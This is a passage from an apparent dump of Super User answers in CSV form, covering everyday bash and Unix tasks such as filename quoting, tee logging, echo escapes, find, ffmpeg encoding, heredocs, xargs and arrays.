</code></pre>

<p>under OpenSolaris the command is:</p>

<pre><code>ps -o ruser,pid,comm -ef|grep python
</code></pre>
"
"Unix: Files starting with a dash, -","120078","<bash><unix><rename>","20","<p>You need to use the keyword <code>--</code> to tell the <em>mv</em> command that the arguments are not to be interpreted as options.  Watch:</p>

<pre><code>$ mv -N1.ext x-f1.ext
mv: invalid option -- N
Try `mv --help' for more information.

$ mv -- -N1.ext x-f1.ext
$ ls
x-f1.ext
</code></pre>

<p>Use <code>--</code> <em>after</em> all the options on the commandline.  Eg, if you're trying to use the <code>-i</code> option to <em>mv</em>, it would go <em>before</em> <code>--</code>:</p>

<pre><code>mv -i -- -filename-begins-with-dash newfilename
</code></pre>
"
"How do I reduce a PDF's size and preserve the bookmarks?","466031","<linux><bash><pdf>","20","<p>You can try ghostscript with ebook output and the bookmarks seems to be preserved:</p>

<pre><code>gs -sDEVICE=pdfwrite -dNOPAUSE -dBATCH -dPDFSETTINGS=/ebook -sOutputFile=newFile.pdf originalFile.pdf
</code></pre>
"
"Force bash script to use tee without piping from the command line","86915","<bash>","20","<p>I couldn't get Dennis' very simple one-liner to work, so here's a far more convoluted method.  I'd try his first.</p>

<p>As mentioned, you can use exec to redirect standard error &amp; standard out for the entire script.  Like so:<br>
<code>exec &gt; $LOGFILE 2&gt;&amp;1</code>
This will output all stderr and stdout to $LOGFILE.</p>

<p>Now, since you want to have this displayed to the console as well as a logfile, you're also going to have to use a named pipe for exec to write to, and tee to read from.<br>
(Dennis' one-liner technically does this as well, although obviously in a different way)  The pipe itself is created with <code>mkfifo $PIPEFILE</code>.  Then do the following.<br></p>

<pre>
# Start tee writing to a logfile, but pulling its input from our named pipe.
tee $LOGFILE &lt $PIPEFILE &

# capture tee's process ID for the wait command.
TEEPID=$!

# redirect the rest of the stderr and stdout to our named pipe.
exec > $PIPEFILE 2>&1

echo ""Make your commands here""
echo ""All their standard out will get teed.""
echo ""So will their standard error"" >&2

# close the stderr and stdout file descriptors.
exec 1>&- 2>&-

# Wait for tee to finish since now that other end of the pipe has closed.
wait $TEEPID</pre>

<p>If you want to be thorough, you can create and destroy the named pipe file at the start and end of your script.</p>

<p>For the record, I gleaned most of this from a random guy's very informative blog post: (<a href=""http://wayback.archive.org/web/20100324151710/http://www.travishartwell.net/blog/2006/08/19_2220.tbh"" rel=""nofollow noreferrer"">Archived version</a>)</p>
"
"Show both ctime and atime in ls output","234158","<bash><ls>","20","<p>You could run <code>stat -c '%x %z' filename.txt</code></p>
"
"Why does `echo -e ""\\\SOME_TEXT""` show only one backslash?","1249828","<linux><bash><echo><escape-characters><escaping>","20","<p>This is because <code>bash</code> and <code>echo -e</code> combined. From <a href=""https://linux.die.net/man/1/bash"" rel=""noreferrer""><code>man 1 bash</code></a></p>
<blockquote>
<p>A non-quoted backslash (<code>\</code>) is the escape character. It preserves the literal value of the next character that follows, with the exception of <code>&lt;newline&gt;</code>. […]</p>
<p>Enclosing characters in double quotes preserves the literal value of all characters within the quotes, with the exception of <code>$</code>, <code>`</code>, <code>\</code>, […] The backslash retains its special meaning only when followed by one of the following characters: <code>$</code>, <code>`</code>, <code>&quot;</code>, <code>\</code>, or <code>&lt;newline&gt;</code>.</p>
</blockquote>
<p>The point is: double quoted backslash is not always special.</p>
<p>There are various implementations of <code>echo</code> in general, it's a builtin in <code>bash</code>; the important thing here is this behavior:</p>
<blockquote>
<p>If <code>-e</code> is in effect, the following sequences are recognized:<br />
<code>\\</code><br />
backslash<br />
[…]<br />
<code>\n</code><br />
new line</p>
</blockquote>
<p>Now we can decode:</p>
<ol>
<li><code>echo -e &quot;\ Hello!&quot;</code> – nothing special to <code>bash</code>, nothing special to <code>echo</code>; <code>\</code> stays.</li>
<li><code>echo -e &quot;\\ Hello!&quot;</code> – the first <code>\</code> tells <code>bash</code> to treat the second <code>\</code> literally; <code>echo</code> gets <code>\ Hello!</code> and acts as above.</li>
<li><code>echo -e &quot;\\\ Hello!&quot;</code> – the first <code>\</code> tells <code>bash</code> to treat the second <code>\</code> literally; <code>echo</code> gets <code>\\ Hello!</code> and (because of <code>-e</code>) it recognizes <code>\\</code> as <code>\</code>.</li>
<li><code>echo -e &quot;\\\\ Hello!&quot;</code> – the first <code>\</code> tells <code>bash</code> to treat the second <code>\</code> literally; the third tells the same about the fourth; <code>echo</code> gets <code>\\ Hello!</code> and (because of <code>-e</code>) it recognizes <code>\\</code> as <code>\</code>.</li>
<li><code>echo -e &quot;\\\\\ Hello!&quot;</code> – the first <code>\</code> tells <code>bash</code> to treat the second <code>\</code> literally; the third tells the same about the fourth; the last one is not special; <code>echo</code> gets <code>\\\ Hello!</code> and (because of <code>-e</code>) it recognizes the initial <code>\\</code> as <code>\</code>, the last <code>\</code> stays intact.</li>
</ol>
<p>And so on. As you can see, up to four consecutive backslashes give one in result. That's why you need (at least) nine of them to get three. 9=4+4+1.</p>
<p>Now with <code>\n</code>:</p>
<ol>
<li><code>echo -e &quot;\n Hello!&quot;</code> – there's nothing special to <code>bash</code>, echo gets the same string and (because of <code>-e</code>) it interprets <code>\n</code> as a newline.</li>
<li><code>echo -e &quot;\\n Hello!&quot;</code> – <code>bash</code> interprets <code>\\</code> as <code>\</code>; <code>echo</code> gets <code>\n Hello!</code> and the result is the same as above.</li>
<li><code>echo -e &quot;\\\n Hello!&quot;</code> – <code>bash</code> interprets the initial <code>\\</code> as <code>\</code>; <code>echo</code> gets <code>\\n Hello!</code> and (because of <code>-e</code>) it interprets <code>\\</code> as a literal <code>\</code> which needs to be printed.</li>
</ol>
<p>The results would be different with <code>'</code> instead of <code>&quot;</code> (due to different <code>bash</code> behavior) or without <code>-e</code> (different <code>echo</code> behavior).</p>
"
"/bin/ls sorts differently than just ls","1428322","<linux><command-line><bash><unix>","20","<p>Do:</p>

<pre><code>/bin/ls --color &gt; file1
/bin/ls &gt; file2
</code></pre>

<p>and compare content, you'll see the difference.</p>

<p>Aliasing <code>ls</code> to <code>/bin/ls --color=auto</code> is likely better idea, it will stop <code>ls</code> from using color codes when not writing directly to terminal (like when piping to next program or writing to a file).</p>
"
"What's the difference between /etc/bash.bashrc and ~/.bashrc? Which one should I use?","49562","<linux><bash><shell><bashrc>","20","<p><code>/etc/bash.bashrc</code> applies to all users</p>

<p><code>~/.bashrc</code> only applies to the user in which home folder it is.</p>
"
"what does it mean a red filename shown with black background?","543397","<bash><shell><ls>","20","<p>What you have there is a dangling symlink, or a symlink pointing to a file or directory which no longer exists.</p>

<p>A symlink itself really has no filesize, because it isn't a file. Symlinks are stored <a href=""http://en.wikipedia.org/wiki/Symbolic_link#Storage_of_symbolic_links"" rel=""noreferrer"">within the inodes themselves</a>, meaning they have no real contents or size, but are instead pointers to other files on the disk.</p>

<p>The output of <code>file libCLHEP-Exceptions-2.1.3.1.a</code> should reveal where it's pointing to.</p>
"
"How to delete files on the command line with regular expressions?","138282","<linux><bash><shell><regex><zsh>","20","<p>In bash you can use:</p>

<pre>
rm FOO1{3..5}
</pre>

<p>or</p>

<pre>
rm FOO1{3,4,5}
</pre>

<p>to delete FOO13, FOO14 and FOO15.</p>

<p>Bash expansions brace are documented <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Brace-Expansion"" rel=""noreferrer"">here</a>.</p>
"
"Recursive ls with conditions","246061","<ubuntu><bash><ls><recursive>","20","<blockquote>
  <p>Why can't I use a command like this to find all the pdf files in a directory and subdirectories?</p>
</blockquote>

<p>The wildcard <code>*.pdf</code> in your command is expanded by <code>bash</code> to all matching files in the current directory, <em>before</em> executing <code>ls</code>.</p>

<hr>

<blockquote>
  <p>How do I do it? (I'm using bash in ubuntu)</p>
</blockquote>

<p>find is your answer.</p>

<pre><code>find . -name \*.pdf
</code></pre>

<p>is recursive listing of pdf files. <code>-iname</code> is case insensitive match, so</p>

<pre><code>find . -iname \*.pdf
</code></pre>

<p>lists all .pdf files, including for example <code>foo.PDF</code></p>

<p>Also, you can use ls for limited number of subfolders, for example</p>

<pre><code>ls *.pdf */*.pdf
</code></pre>

<p>to find all pdf files in subfolders (matches to bar/foo.pdf, not to bar/foo/asdf.pdf, and not to foo.PDF).</p>

<p>If you want to remove files found with find, you can use</p>

<pre><code>find . -iname \*.pdf -delete
</code></pre>
"
"How do I clear my bash screen while maintaining scrollback?","315386","<bash>","20","<p>Just press Ctrl-L on the keyboard.</p>
"
"Converting video to WebM with ffmpeg/avconv","556463","<bash><ffmpeg><webm>","19","<blockquote>
  <p><strong>Note:</strong> This information is based on the FFmpeg Wiki on <a href=""https://trac.ffmpeg.org/wiki/Encode/VP9"" rel=""nofollow noreferrer"">VP9 encoding</a>. Please refer to that article for more information – it will be continuously maintained and extended. For the best results you should use the a recent version of <code>ffmpeg</code> by <a href=""http://ffmpeg.org/download.html"" rel=""nofollow noreferrer"">downloading it from their website</a> (a static build will suffice; it contains the <code>libvps-vp9</code> encoder).</p>
</blockquote>

<h2>Variable Bit Rate</h2>

<p>VBR encoding gives you the optimal overall quality, since the encoder can freely choose how many bits to assign to a frame. Choose this mode unless you are preparing videos for constant-bitrate streaming.</p>

<h3>Option 1: Constant quality encoding</h3>

<p>Typically, if you do not want to target a specific file size, you should let the bitrate vary freely, as that will lead to the highest quality. You can do this by setting the bitrate to 0 and the constant rate factor (<a href=""http://slhck.info/video/2017/02/24/crf-guide.html"" rel=""nofollow noreferrer"">CRF</a>) to the target quality level:</p>

<pre><code>ffmpeg -i input.mp4 -c:v libvpx-vp9 -crf 30 -b:v 0 output.webm
</code></pre>

<p>CRF value can be from 0–63. Lower values mean better quality. Recommended values range from 15–35, with 31 being recommended for 1080p HD video. Google has a guide with <a href=""https://developers.google.com/media/vp9/settings/vod/"" rel=""nofollow noreferrer"">more info on that</a>.</p>

<h3>Option 2: Two-pass encoding with a target bitrate</h3>

<p>If you want your file to have a specific target bitrate or file size, you need to specify the rate and use two-pass encoding (which will ensure an optimal quality distribution). Here we're choosing 5 MBit/s, which should be enough for 1080p content.</p>

<pre><code>ffmpeg -i input.mp4 -c:v libvpx-vp9 -b:v 5M -pass 1 -f webm /dev/null &amp;&amp; \
ffmpeg -i input.mp4 -c:v libvpx-vp9 -b:v 5M -pass 2 output.webm
</code></pre>

<p>Windows users need to use <code>NUL</code> instead of <code>/dev/null</code>, and a <code>^</code> instead of <code>\</code>.</p>

<h2>Constant Bit Rate</h2>

<p>First of all, libvpx <a href=""http://www.webmproject.org/docs/encoder-parameters/#3-rate-control"" rel=""nofollow noreferrer"">offers constant bitrate and variable bitrate encoding modes</a>. Constant bitrate should be avoided whenever possible (unless you target a specific file size or streaming scenario), since the average quality per file size will be worse. Still, you could try setting a constant bitrate if nothing else works for you, e.g. with 1 MBit/s:</p>

<pre><code>ffmpeg -i input.mp4 -c:v libvpx-vp9 -minrate 5M -maxrate 5M -b:v 5M output.webm
</code></pre>

<p>Look at the output and increase or decrease the bit rate to your liking (or file size constraints). For example, you can use <code>500K</code> or <code>5M</code>, et cetera.</p>

<p>You have to specify <code>-minrate</code>, <code>-maxrate</code> and the bitrate <code>-b:v</code> in order for the encoder to use CBR. They all have to have the same value—otherwise it'll choose a different target bitrate instead and do VBR encoding, but with bad quality.</p>

<h2>Audio</h2>

<p>The current audio codec of choice for VP9 encoding is Opus. FFmpeg will choose the necessary encoder and its options by default. If you want to explicitly set <code>-c:a libopus</code>, you can do that as well. Refer to the <a href=""https://ffmpeg.org/ffmpeg-codecs.html#libopus-1"" rel=""nofollow noreferrer""><code>libopus</code> documentation</a> for more options.</p>
"
"Is it possible to print out the shell expansion?","861077","<bash><shell><wildcards><expansion>","19","<p>Just use <code>echo</code>...put it in front of the command you want to expand. I use this quite frequently.</p>

<pre><code>$ ls
one.txt
two.txt
three.dat
$ echo rm *.txt
rm one.txt two.txt
$ rm *.txt
</code></pre>

<p>You can use <kbd>Home</kbd> and <kbd>Del</kbd> to quickly add/remove the preceding <code>echo</code>.</p>

<p><strong>EDIT</strong><br>
As <a href=""https://superuser.com/questions/861077/is-it-possible-to-print-out-the-shell-expansion/861089?noredirect=1#comment1141926_861089"">pointed out</a> in the comments, this will not work if the command is not just a simple command (like if it is a <code>for</code> loop, uses the pipe <code>|</code>, or <code>&amp;&amp;</code> or anything else like that).</p>
"
"How do I enable syntax highlighting for .bash_aliases in vim?","178412","<linux><bash><vim><syntax-highlighting>","19","<p>Go to vim and run:</p>

<pre><code>:echo $VIMRUNTIME
</code></pre>

<p>Usually the value will be something like:<br>
/usr/share/vim/vim72<br>
Then edit (using root) the file <strong>/usr/share/vim/vim72/filetype.vim</strong><br>
Search for bashrc.<br>
You will find a line that looks like this:</p>

<pre><code>au BufNewFile,BufRead .bashrc*,bashrc,bash.bashrc,.bash_profile*,.bash_logout*,*.bash,*.ebuild call SetFileTypeSH(""bash"")
</code></pre>

<p><br>
Edit the line and add your filename (.bash_aliases) to it.</p>

<p>That's it, now it should work.</p>
"
"Copy and chmod/chown at the same time","580743","<linux><bash>","19","<p>The cp man page does not list any options that would allow you to do this just with the CP command.  If you are wanting to just issue a command and ""walk away"", you can put the 2 commands on 1 line separated by a ;  to automatically execute the commands in sequence.</p>

<pre>
cp log.xz /home/user/Documents ; chown user:user /home/user/Documents/log.xz
</pre>
"
"What does $@ mean as a bash script function parameter","694501","<bash><shell>","19","<p>The <code>$@</code> variable expands to all the parameters used when calling the function, so</p>

<pre><code>function foo()
{
    echo ""$@""
}

foo 1 2 3
</code></pre>

<p>would display <code>1 2 3</code>. If not used inside a function, it specifies all parameters used when calling the script. See the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Special-Parameters"">bash manual page</a> for more info.</p>
"
"How can I move around the bash commandline efficiently?","113103","<keyboard-shortcuts><bash>","19","<p>Try this:</p>

<pre><code>mkdir /where/the/hell/is/that/thing
</code></pre>

<p>then press <kbd>alt</kbd>+<kbd>.</kbd></p>

<p>depending on your OS and terminal you might have to type
    <kbd>esc</kbd> then <kbd>.</kbd></p>

<p>You can also press     <kbd>alt</kbd>+<kbd>1</kbd>+<kbd>.</kbd> to pick a specific prior argument.</p>

<p>This is much better than !! or !$ because you can actually see what you are about to run, and it takes less keystrokes anyway.</p>

<p>edit: strictly speaking it is <kbd>meta</kbd> not <kbd>alt</kbd>, so it might also work with the ""windows"" key depending on how your keyboard is setup..</p>
"
"How to solve: -bash: : cannot execute binary file","724301","<macos><bash><binary-files>","19","<h1>Sorry, this file is for GNU/Linux</h1>

<p>According to your <code>file</code> output, this program is for GNU/Linux. I know this because:</p>

<ol>
<li>The file <code>b1</code> is in the <a href=""http://en.wikipedia.org/wiki/Executable_and_Linkable_Format"" rel=""noreferrer""><code>ELF</code> (Extensible and Linkable Format)</a> format, while Mac OS X uses the <code>Mach-O</code> format for binaries;</li>
<li><code>file</code> recognizes this file is for <code>GNU/Linux 2.6.18</code>, meaning it'll work on most modern Linux distributions.</li>
</ol>

<p>To solve your problem, you must either run this problem within a Linux distribution, recompile the program, or get the Mac OS X version of this program.</p>

<h1>So... Why doesn't <code>b1</code> work on <em>XYZ</em> OS or CPU?</h1>

<p>Just as people speak different languages, different computers understand different instructions. For instance, your Mac uses an Intel processor, while your Android phone uses an ARM processor. Compare these two processors to English and French. They may belong to the same language family, but still, you can't speak both at the same time. This leads to a conclusion:</p>

<blockquote>
  <p>Dissimilar computers ""talk"" in different tongues.</p>
</blockquote>

<p>As for why different operating systems (such as Windows, Mac OS X, and Linux) can't use the same binaries, consider this:</p>

<blockquote>
  <p>What makes software objectively different to hardware? Not much.</p>
</blockquote>

<p>Both provide a system and a ""language"" that allows for more complex components of the computer to complete tasks for the end user. Both require an agreed language to get work done. Imagine if there were 10 people in a shouting match, each speaking a different language. This is why different OS software need different binaries, even if both operating systems use the same processor.</p>
"
"Pushing my PS1 prompt over ssh","221001","<linux><bash><ssh><prompt>","19","<p>Upload a file on each remote machine, say <code>~/.my_custom_bashrc</code>, with your custom <code>bash</code> configuration, (in this case <code>PS1=...</code>) then launch <code>ssh</code> with:</p>

<pre><code>ssh user@host -t ""bash --rcfile ~/.my_custom_bashrc -i""
</code></pre>

<p>You can easily use a <code>bash</code> function as wrapper for readability.</p>
"
"Command vs program?","917211","<linux><command-line><bash><perl>","19","<p>In simple terms, a command is an instruction (or a set of instructions) to be carried out by a computer.</p>

<h2>Stand-alone commands</h2>

<p>Fundamental Unix utilities such as <code>ls</code>, <code>ln</code>, etc. are (usually) written in C and compiled to be stand-alone executable <strong>programs</strong> that don’t require an interpreter to be executed; they usually require certain <em>library</em> files to be installed on the system but that’s an answer for another question.</p>

<h2>Scripts</h2>

<p>A script is a collection of commands and in fact, scripts themselves are considered to be a command.</p>

<p>A <em>Perl script</em> is a sequence of Perl statements and requires a <code>perl</code> executable (stand-alone and compiled) <em>program</em> to interpret the Perl statements.</p>

<p>Sometimes large and complex interpretative scripts (in languages such as Perl, Python and Ruby) are also referred to as <em>interpreted programs</em> while the term <em>script</em> is reserved for shorter and simpler scripts.</p>

<p>A <em>shell script</em> is a sequence of other commands (any type of command) and it requires a Unix shell such as Bash to interpret the script. From the Bash man page:</p>

<blockquote>
  <p>Bash is an sh-compatible command language interpreter that executes commands read from the standard input or from a file.</p>
</blockquote>

<h2>Shell Built-ins</h2>

<p>Shells usually have <strong>built-in</strong> commands which are neither stand-alone programs nor scripts. Instead, they are part of the shell itself and run directly by the shell. <code>cd</code> is an example of such a built-in command.</p>

<p>Some times there are commands which exist as shell built-ins and as
stand-alone commands at the same time, e.g., the <code>echo</code> command.</p>

<pre><code>$ type -a echo
echo is a shell builtin
echo is /usr/bin/echo
</code></pre>

<p><code>echo</code> on its own executes the shell built-in while the stand-alone command can be executed by providing its full path.</p>

<p>Run built-in version of echo:</p>

<pre><code>$ echo --version
--version
</code></pre>

<p>Run stand-alone <code>echo</code> program:</p>

<pre><code>$ /usr/bin/echo --version
echo (GNU coreutils) 8.23
Packaged by Cygwin (8.23-4)
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
</code></pre>

<p>Note: The above specifics refer to a Unix environment but the same principles apply to a Windows environment.</p>
"
"ssh config under cygwin","493270","<windows-7><bash><ssh><cygwin><openssh>","19","<p>You have to run <strong>ssh-host-config</strong> first. It will generate a ""ssh_config"" file in <em>/etc/</em>.</p>
"
"how to execute command after current running command in bash?","35179","<linux><bash>","19","<p>You can do something like this:</p>

<ol>
<li>stop execution of wget with ctrl-z (it's not stopped, it's suspended)</li>
<li>put it into background (bg)</li>
<li>run: wait; shutdown -h now</li>
</ol>

<p>wait will wait for all programs ran in background from current shell - i.e. this wget.</p>

<p>After wait will finish - shutdown will go on.</p>
"
"Prepend prefix in tar","595510","<bash><tar>","19","<p>The GNU version of <code>tar</code> supports the <code>--transform</code> option (and its alias <code>--xform</code>), you could use it like this</p>

<pre><code>tar --transform ""s/^$MYPATH/$VERSION/"" -cf archive.tar.bz2 ""$MYPATH""
</code></pre>

<p>For example, given this directory tree</p>

<pre><code>foo
└── foo.txt
</code></pre>

<p>the command </p>

<pre><code>tar --transform ""s/^foo/bar/"" -cf foo.tar.bz2 foo
</code></pre>

<p>will produce an archive like</p>

<pre><code>$ tar -tf foo.tar.bz2
bar/
bar/foo.txt
</code></pre>
"
"Bash is slow to start because of this line in .bashrc. What could cause this?","1209172","<linux><bash><alias><bashrc><bash-alias>","19","<p>Because the command substitution is inside double-quotes, it is evaluated at the time that the command is defined.  This causes <code>find</code> to look through your hard disk contents while <code>.bashrc</code> is running.</p>

<p>You, by contrast, appear to want it evaluated at the time of use.  In that case, use single quotes:</p>

<pre><code>alias prog='/path/to/script.sh $(find ""$(pwd)"" -name prog)'
</code></pre>

<p>Note that this alias will fail if any of the files found have whitespace in their names.  To avoid that:</p>

<pre><code>alias prog='find . -name prog -exec /path/to/script.sh {} +'
</code></pre>

<p>This latter form will work reliably for any kind of file name.</p>
"
"Make a pipe conditional on non-empty return","210054","<bash><pipe>","19","<p>The following <code>ifnotempty</code> function pipes its input to the command passed as an argument, except that it does nothing if the input is empty. Use it to pipe <code>source --foo</code> into <code>sink --bar</code> by writing <code>source --foo | pipe_if_not_empty sink --bar</code>.</p>

<pre><code>pipe_if_not_empty () {
  head=$(dd bs=1 count=1 2&gt;/dev/null; echo a)
  head=${head%a}
  if [ ""x$head"" != x"""" ]; then
    { printf %s ""$head""; cat; } | ""$@""
  fi
}
</code></pre>

<p>Design notes:</p>

<ul>
<li>I would expect this implementation to work on all POSIX/Unix platforms, though strictly speaking it is not standards-compliant: it relies on <code>dd</code> not reading more than the one byte it's told to read on its standard input.</li>
<li>I think <code>head -c 1</code> would be a suitable replacement for <code>dd bs=1 count=1 2&gt;/dev/null</code> on Linux.</li>
<li>On the other hand, <code>head -n 1</code> would not be suitable because <code>head</code> typically buffers its input and may read more than the one line it outputs — and since it's reading from a pipe, the extra bytes are just lost.</li>
<li><code>read -r head</code> and even <code>read -r -n 1 head</code> are not suitable here because if the first character is a newline, <code>head</code> would be set to the empty string, making it impossible to distinguish between empty input and input starting with a blank line.</li>
<li>We can't just write <code>head=$(head -c 1)</code> because if the first character is a newline, command substitution would strip the final newline, making it impossible to distinguish between empty input and input starting with a blank line.</li>
<li>In bash, ksh or zsh, you can replace <code>cat</code> by <code>&lt;/dev/stdin</code> for a microscopic performance gain.</li>
</ul>

<hr>

<p>If you don't mind storing the whole intermediate data in memory, here is a very slightly simpler implementation of <code>pipe_if_not_empty</code>.</p>

<pre><code>pipe_if_not_empty () {
  input=$(cat; echo a);
  if [ ""x$input"" != x""a"" ]; then
    { printf %s ""${input%a}""; } | ""$@""
  fi
}
</code></pre>

<p>Here is a slightly simpler implementation with the following caveats:</p>

<ul>
<li>The data produced by the source is considered empty if and only if it consists solely of newline characters. (This may in fact be desirable.)</li>
<li>The data fed into the sink ends with exactly one newline character, no matter how many newlines the data produced by the source ends with. (This is could be a problem.)</li>
</ul>

<p>Again, the whole data is stored in memory.</p>

<pre><code>pipe_if_not_empty () {
  input=$(cat);
  if [ ""x$input"" != x"""" ]; then
    { printf '%s\n' ""${input}""; } | ""$@""
  fi
}
</code></pre>
"
"Sending simulated keystrokes in Bash","585398","<linux><bash><automation>","19","<p>To feed text into a program's stdin, use <a href=""http://wiki.bash-hackers.org/howto/redirection_tutorial"" rel=""noreferrer"">pipes and/or redirection</a>:</p>

<pre><code>echo 1 | myprogram

(echo ""First line""
 echo ""Second line"") | myprogram

myprogram &lt;&lt;EOF
First line
Second line
EOF
</code></pre>

<p>In case of interactive CLI programs (<em>not</em> full-terminal ones), it is possible to use named pipes or <a href=""http://wiki.bash-hackers.org/syntax/keywords/coproc"" rel=""noreferrer"">coprocesses</a> as a sort of poor-man's <code>expect</code> (which you ruled out due to being Tcl):</p>

<pre><code>mkfifo in out
myprogram &lt;in &gt;out &amp;
echo ""First line"" &gt;in
read -r reply &lt;out

mkfifo in out
myprogram &lt;in &gt;out &amp;
exec {infd}&gt;in {outfd}&lt;out
echo ""First line"" &gt;&amp;$infd
read -r reply &lt;&amp;$outfd

coproc foo { myprogram; }
echo ""First line"" &gt;&amp;${foo[1]}
read -r reply &lt;&amp;${foo[0]}
</code></pre>

<p>(Be careful when reading from the output pipe; e.g. <code>head -1 &lt;out</code> won't just read one line – it'll buffer one full 4k block, print one line, discard the rest.)</p>
"
"How to compare parts of files by hash?","1381285","<bash><hashing>","19","<p>Creating hashes to compare files makes sense if you compare one file against many, or when comparing many files against each other.</p>

<p>It does not make sense when comparing two files only once: The effort to compute the hashes is at least as high as walking over the files and comparing them directly.</p>

<p>An efficient file comparison tool is <code>cmp</code>:</p>

<pre><code>cmp --bytes $((100 * 1024 * 1024)) file1 file2 &amp;&amp; echo ""File fragments are identical""
</code></pre>

<p>You can also combine it with <code>dd</code> to compare arbitrary parts (not necessarily from the beginning) of two files, e.g.:</p>

<pre><code>cmp \
    &lt;(dd if=file1 bs=100M count=1 skip=1 2&gt;/dev/null) \
    &lt;(dd if=file2 bs=100M count=1 skip=1 2&gt;/dev/null) \
&amp;&amp; echo ""File fragments are identical""
</code></pre>
"
"Cannot execute script while its permission is 'x'","1452496","<linux><bash><shell>","19","<ul>
<li><p>The execution is not allowed because the file is on a filesystem mounted with the ""noexec"" option. Use <code>findmnt -u -T .</code> to find out if that's the case. If you have root privileges, <code>mount -o remount,exec &lt;dir&gt;</code> should remove this option.</p></li>
<li><p>The execution is not allowed by <a href=""https://en.wikipedia.org/wiki/Mandatory_access_control"" rel=""nofollow noreferrer"">MAC</a> policies (SELinux, SMACK, possibly AppArmor). Check the system logs, starting with <code>journalctl -n 100</code> and <code>dmesg</code>. Bypassing this (if you're the administrator) depends on which MAC system is actually in use.</p></li>
</ul>
"
"Use Notepad++ from Cygwin without having the shell wait for an exit code","168971","<bash><cygwin><notepad++>","19","<p>You could try a <code>bash</code> function to pass the arguments before the ampersand:</p>

<pre><code>np ()
{
    /cygdrive/c/Program\ Files/Notepad++/notepad++.exe $* &amp;
}
</code></pre>

<p><strong>BUT</strong> the bigger issue may be the whole idea of <em>not</em> waiting until Notepad++ exits. Shell commands which use <code>$EDITOR</code> typically are <em>designed</em> to wait until the editor sends back an indication that the editing has completed. This usually means that the editor has exited (e.g. with <code>vi</code> or <code>nano</code>). </p>

<p>Emacs has a way to set your <code>EDITOR</code> to <code>emacsclient</code> and then when you're done editing, you hit a magical keystroke (<code>C-x #</code>) to indicate that editing is complete. If Notepad++ had something similar for cygwin users, I can see how this would work.</p>

<p>Another alternative is to use plain, boring, simple Notepad as your EDITOR and reserve Notepad++ for heavy use (I got the idea from <a href=""http://blog.barrkel.com/2008/05/life-with-cygwin-paths-notepad-and.html"" rel=""noreferrer"">this blog post</a>)</p>
"
".profile not running when I start a bash terminal","385766","<bash><.profile>","18","<p>It's not a login shell.</p>

<p>If a shell is a login shell, it will look for .bash_profile if it exists, then .profile.
Other shells look for .bashrc</p>

<p>So, you can put the things you want in every shell instance in .bashrc, and possibly have a reference that sources .bashrc in .profile.</p>

<p>So:
.bashrc:</p>

<pre><code>stuff you want
</code></pre>

<p>end of .profile:</p>

<pre><code>[ -n ""$BASH"" ] &amp;&amp; [ -f ~/.bashrc ] &amp;&amp; . ~/.bashrc
</code></pre>
"
"seeking to upgrade my bash magic. help decipher this command: bash -s stable","519882","<bash>","18","<p>The <code>-s</code> thing is called an option. In your case, it means that <code>bash</code> will be executed with the first <em>positional parameter</em> set. If you want to play with that:</p>

<pre><code>$ bash -s let us set some positional parameters just for fun
$ # doh? nothing seemed to happen
$ # In fact here we're in a new instance of bash with the parameters set. Look:
$ echo ""$3""
set
$ echo ""$5""
positional
$ # Get it?
$ printf ""%s\n"" ""$@""
let
us
set
some
positional
parameters
just
for
fun
$ # Amazing!
$ # Let's get out of here!
$ exit
$ # (back to previous bash session)
$
</code></pre>

<p>In your case, the script downloaded via curl is sent to <code>bash</code> (so it will be executed) and will have the first positional parameter set to <code>stable</code>.</p>

<p>If ever you're stuck with options you don't know what they do: <code>man bash</code> and then type <code>/-s</code> this will more or less get you to where the <code>-s</code> option is described. Or if you want to know what the <code>-u</code> option does for <code>sed</code>: <code>man sed</code> and then type <code>/-u</code>.</p>

<p>Hope this helps!</p>
"
"xargs -I replace-str option difference","655264","<bash><xargs>","18","<p>The <code>-I</code> requires a defined placeholder.  The <code>-i</code> option will assume <code>{}</code> is the placeholder.  This was where I found any assumption of {} in <code>man xargs</code> at least on Cygwin and CentOS.</p>
<p>xargs called without either option does not need the placeholder and it just appends the STDIN to the end of the arguments.</p>
<p>Just add <code>echo</code> to your examples to see what xargs is doing:</p>
<pre><code>$ ls -1
Hello World/
</code></pre>
<p>Your example mistakenly uses <code>{}</code>:</p>
<pre><code>$ ls -1 | xargs echo file {}
file {} Hello World/
</code></pre>
<p>so the <code>file</code> cmd sees args of <code>{} Hello World</code> and errors.</p>
<p>If you want to explicitly use <code>{}</code> in your xargs call:</p>
<pre><code>$ ls -1 | xargs -I{} echo file {}
file Hello World/
</code></pre>
<p>Or with No placeholder:</p>
<pre><code>$ ls -1 | xargs echo file
file Hello World/
</code></pre>
<p>xargs as called above does not need the {}. It appends the STDIN to the end of the command without a placeholder.  The use of {} usually means you want the STDIN somewhere in the middle of the cmd to execute, as in:</p>
<pre><code>$ ls -1 | xargs -i mv {} /path/to/someplace/.
</code></pre>
"
"How to pass variables to a HEREDOC in bash?","456615","<linux><bash><shell-script>","18","<pre><code>cat &lt;&lt;EOF &gt; test
My name is $NAME
EOF
</code></pre>

<p>or even</p>

<pre><code>cat &lt;&lt;==end &gt; test
My name is $NAME
==end
</code></pre>

<p>Worked for me.</p>

<p>Looks like when you take <code>==end</code> in the <code>'</code> variable doesn't substitute.</p>

<p>ah, here it is in the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Redirections"" rel=""noreferrer"">man page</a> (look 3.6.6):</p>

<blockquote>
  <p>The format of here-documents is:</p>

<pre><code>      &lt;&lt;[-]word
              here-document
      delimiter
</code></pre>
  
  <p>No  parameter expansion, command substitution, arithmetic expansion, or
  pathname expansion is performed on <em>word</em>.  If any characters in <em>word</em> are
  quoted,  the  <em>delimiter</em> is the result of quote removal on word, and the
  lines in the here-document are not expanded.  If <em>word</em> is unquoted,  all
  lines  of  the here-document are subjected to parameter expansion, command substitution, and arithmetic expansion. [...]</p>
</blockquote>
"
"Test if element is in array in bash","195598","<bash><array>","18","<p>In Bash 4, you can use associative arrays:</p>

<pre><code># set up array of constants
declare -A array
for constant in foo bar baz
do
    array[$constant]=1
done

# test for existence
test1=""bar""
test2=""xyzzy""

if [[ ${array[$test1]} ]]; then echo ""Exists""; fi    # Exists
